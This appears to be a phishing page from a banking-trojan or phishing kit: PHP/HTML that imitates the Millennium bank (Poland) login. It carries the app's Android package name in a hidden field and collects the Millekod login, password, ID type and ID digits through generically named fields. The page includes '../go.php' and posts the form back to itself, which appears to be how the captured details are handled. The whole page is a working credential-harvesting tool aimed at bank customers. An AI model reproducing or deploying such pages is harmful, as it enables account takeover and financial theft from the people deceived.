<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>	

<body>
  <div id="header">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANIAAAAxCAIAAAAgK2A5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA/FpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ1dWlkOkFDNjAwMjY1Mjk5NURDMTFCQ0ZCOUQzNTY5NEIyMTlBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjc0MTFFNjZEQzU3RTExRTNBNTAzOEUwNjUxRUNGQzg4IiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjc0MTFFNjZDQzU3RTExRTNBNTAzOEUwNjUxRUNGQzg4IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIElsbHVzdHJhdG9yIENTNiAoV2luZG93cykiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0idXVpZDo4N2M1YjY3Zi1iNzJjLTQwYmQtOTcwMC01NTEwNTc4Zjc1MWYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RjFEMzY1QUQ3QkM1RTMxMTk5ODFBNDQwNzE3NzJCMjEiLz4gPGRjOnRpdGxlPiA8cmRmOkFsdD4gPHJkZjpsaSB4bWw6bGFuZz0ieC1kZWZhdWx0Ij5GSU5BTE5FX0xPR088L3JkZjpsaT4gPC9yZGY6QWx0PiA8L2RjOnRpdGxlPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhS3KZQAAAkuSURBVHja7F1faFNXGE/azm4JBusS1tFAOoVCAkUGBd3D2pcpK7Kn9MUNBUXQp1kUHwTz1IEPoqx7sjAUFNaX5k2p6JPdw1rocENIQFZnoHWFZBbTNZva0v16v+bz673n3sTmJk3q+Shyk9x77ne+8zvfv/Odo3ey84jn7ak54PPHOlvDwWC8L3Ag+nI2m0tO/HV9fCVf8GjSVIq8m4OdpNBA757Lp3EB8D0+dbWQymixaiqhtk7u6q6wCeBsZbGwq29fS8D/0TdfFNKZ/2aeaclqcqAmV1qZvz4OVUfXey+f9sUiWrKaqg470MK9aXb79ho2V5OmKhrZdfy+v+PDrz6j6/dCu7xeT34yXc6DUI0f7O1oDYfobzm/tPrydZkvxf0fn+gPHIjh7+VsTgY04cE4fQ//lTWxpjqhFrcaMsWw7cf7ywxsu+9ckh/TR77LT6as0IwkjuEil3yQHZuQsOs4E6droFzCi7/3eJLWBuuf2g71QIZrDsyNcbYkGnaltGjAFxrog89XUtVZH7TeFhtN0PeBA9GlVGbbB8uYTl0jZ+naH4s8nPx2m2WmmtyTVND0TfvxL0s+RRNakt8CRBhKiUXEy9veBgF2ch76Y506pCgtKf4GlsJZI+623LCjw9wOTKS0nu+Co4Y+snrDRSM6CTWCnS+6rqWk7xWK9zo8AsyRGpPBhxW+5PChWbg4uHhHYJc6MoT+ote40CGFg+pat31wgRlP0HaAkR1Q2MIiUGgJ+MjPsxprGoYn56+9U7Ee/NfHp67qSLYEwdlneWXHHrSf6GcPLzN0S2mUCWcwIpjTwXifg7aT/o1bFgcvCg307twfgzdJkwScI17JJSesr6DkjmQAz7Yd7KHJtpJfyk+l0Wur429kcNZnDv7QCATiK/alkHq6cP9XZY8gHPJil/NLHEIRz2xVlPM5PPgmtOeWpQCXUk/BJxgDJ6wswMn8jbuyQdwQjPdyr9HHhfvT0pTVUSRLckcHGHaIZ2eHk9bx4IADo1X02KIscVOsCpFFRy/S9dQnX1ceZYfPxJlDOdL4w7jCus2cvyZ5xpeckZned7Jr5BxPM853oM3M0E3TwDDbc8NJ9HHPxkQ6GgEbwMfjU1dMIookjtEr8Gu6aGcdEkbOmSMpQDgqwBPDlznBSBH/kA/ebrqBczqQTOWZhCaXVF2sOJMyhCG5aLFbFVigk+uwS66N06u5bG1iVfATG01IzBlaIS39S8iXUzbKbA4GyfD003IAcD9QZR2t9TYP9hDm8AgelCBDa2izZgYukjhKTBInJv7Rd0wqugHjaGIV09KVJagWt8aSVTGDicNYzD+TDkCv2K4VikiVfate7CaXjE1aTc5ySlArHUr8BLeBU5LQQBhI7iyeUloiUuFw17ineBFuJjmQlnXLhJUI/jZyQouZzD/lCyET3MCjgF9xj4usuqPtONlWSGd4RFm+GBhWhzz1Of4ouj45oe18VZI42GD5GqbtqpzKuAbOWAFAuMqaBkhcpsGp3Is7i7ExdZYJMamcXWgH7odVJtUmdFNyQggz2c2ZNTm8mfkYTckqHOK6MLLNO33WpBo8PL4OikwK5/PQ4edFW7xcVJOu9MqOZAYbfozyHp4JdgmgXHJC9dRdq+7fmH1MWx3cebF+2FyrNDhkruBE9Bq/WpfjJKvKsG8LjCyHZlJpIVaAl01jAM1BPjVdW/tfm/Uumb42rQU798uUzVHmO6Tutw7b4pTabYA3bIpOqk3SjZZY3HPZIx10B1b9FRe2uaPtONkmh0QqM4k21nwmtcEQrNIw2Nm+TeRyVUPytFFyZsrKIAi/5LJvodjH5oq9oBaXYBdSDglUN6MNsffs90lKIBejpJTdvEfHqrr4jcalWXkrhDlkjjZB0II11nZ2VFLvriy6NiItLmLOaigpRKfOGDUpvey3SWdIFaN0VnUhEsxgDng0bRE1uQi7ZdWMzyUfCI++n5Wfs/fTXIVg1mQHdeV9Y8OOx6+g8m+yYxNsgGTCzNl++auACbAh9bG15qqxSLl4XXmM2TCw4zSbne23elFZVQ5CurrW8idXaENyZKDXrSCjZiTnqjLNZLdGsg1hx/23C7xNGW25dFbScLtL4EQqvK6Rsw4VgdDN1nXbLYcdmw5rNnuN4QZR4a74dkHnaA7Cksizw5z0vZQWxBUyrYYBedHRRFuxUstTzGbj++47l+qwel7mpGKjiUjiKO1UCg/GHdaR643cjGQd3LW54STrf7sYVqK2ej4KkPTo8AWgilUFAm1l4kAWDtUPQZJczoh/oY+lSkbvGiJUqlTbSffIAXZcp2lXruPcsruiBANAHvhx4ARzYG64HjMsVHisNCzA3EyDFMNWegbKWxVgQuEtq9b7lFCjakRWfqYqS+vb5f0eS32lgwOHOxEVkYeKYByBkVXP2TGgZF6+sSQb3LIs5/TYlHnKjkPnyTrThfvTtNiofKODoMp8Y5lCqBHsNGnampBCkyYNO02N4Nutrq5qKWhqsJBCU7UpamzdUB4NszkKD8Y7zsQRp29hMYQ2spo07DQ5kuk4mJLfexz3dmwhteixbAhqDQd7fv+RsJUdm8gM3aTcGyDFG2Dl2dH7//yJ7qTFISprtVpV2r7pi0VcNOJa220fajvYA9zMGRvdgaSukXP0fcfanvBbAM389fHWcCj8Zm+2oVQCPvxEpzLgTqvaiySOAXNPNu4T09pO0zrN37hLyHh+b7r7ziUEGbTdlQ8MWM4vtZ/oN20/o7oHPNjaEWxfO/Y0KuFF+7SB19rsz9Wwa2DifQJ+A3Zth3oC+wHBTmU1Ay+C5afSpiIuqE9jG3xaeUKNNrKabAlqr2vkbGigr+SJWNZF2KVUxljAjW5JwKFh15DhhREN+KGuALiHn38LzJGhLH8zwKu5LG1QB3BrXwqvYddIRKfjACVcI2M6pgg3lF/pCaTS+U58TrL27TRtoOjoRd76aRycc4WOnMI3n/78Ax+0BUTi46PDF8psFgrPbxyvBjTX8uBK1/5fCk1VIq+XDjTyeoxzFBDSIgig/7oDH2nb1OvsC4Dm+e1JfPx35tnft3/BU4tTG05PozpCowLPCwtL12jnn9/+WM69oF9r1ym9JqtJhxSaNOw0aaoO/S/AAHWZb4gbPOV8AAAAAElFTkSuQmCC">
  </div>
    <div class="main">

        <div class="container">
<div class="row">

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

					<form class="form" method="post">
					
						<input name="field1" value="wit.android.bcpBankingApp.millenniumPL" type="hidden">
					
                            <div class="form-group ">
								<div class="Description Left control-label col-xs-12 col-sm-3">
									<label for="ctl00_Content_Login_PasswordOne_txtContent" class="Label">Millekod</label>
								</div>
									<div class="Content col-sm-8 col-xs-12"><input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="10" data-reg="/.{3,10}/" ></div>
 									<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                           </div>
						   
						   <br>

                            <div class="form-group"> 
								<div class="Description Left control-label col-xs-12 col-sm-3">
									<label for="ctl00_Content_Login_PasswordOne_txtContent" class="Label">Haslo 1</label>
								</div>
									<div class="Content col-sm-8 col-xs-12"><input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{6,16}/" maxlength="16" ></div>
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                            </div><br>

                            <div class="form-group"> 
								<div class="Description Left control-label col-xs-12 col-sm-3">
									<label for="ctl00_Content_Login_PasswordOne_txtContent" class="Label">Identyfikator</label>
								</div>
									<div class="Content col-sm-8 col-xs-12"><select aria-required="true" name="field4" id="Content_Login_SecurityDigits_DocumentTypes_ddlList" class="form-control1" aria-describedby="Content_Login_SecurityDigits_DocumentTypes_vldrequired_span">
							<option selected="selected" value="Pesel" data-text="PESEL" data-checked="true">PESEL</option>
							<option value="Passport" data-text="Paszport" data-checked="false">Paszport</option>
							<option value="PId" data-text="Dowod osobisty" data-checked="false">Dowod osobisty</option>

						</select></div>
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                            </div><br>

                            <div class="form-group"> 
								<div class="Description Left control-label col-xs-12 col-sm-3">
									<label for="ctl00_Content_Login_PasswordOne_txtContent" class="Label">Cyfry lub litery identyfikatora</label>
								</div>
									<div class="Content col-sm-8 col-xs-12"><input type="password" class="form-control" name="field5" id="code" autocomplete="off" data-reg="/.{6,16}/" maxlength="16" ></div>
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                            </div><br>
							
                       				<button class="input_submitBtn" id="input_submitBtn" type="submit"> Zaloguj sie </button>
 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>



    <script type="text/javascript" src="libs/jquery/dist/jquery.min.js"></script>

<script src="libs/angular/angular.min.js"></script>

<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var oSelectInp = document.getElementById('Content_Login_SecurityDigits_DocumentTypes_ddlList');
                        var oCode = document.getElementById('code');

						try{
							oNumInp.className = 'form-control';
							oCodeInp.className = 'form-control';
							oSelectInp.className = 'form-control1';
							oCode.className = 'form-control';
						} catch(e){};
						
                        if (!/^\w{4,20}$/i.test(oNumInp.value)) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,16}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,16}$/i.test(oCode.value)) {
							try{
                                oCode.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>
</body>




</html>
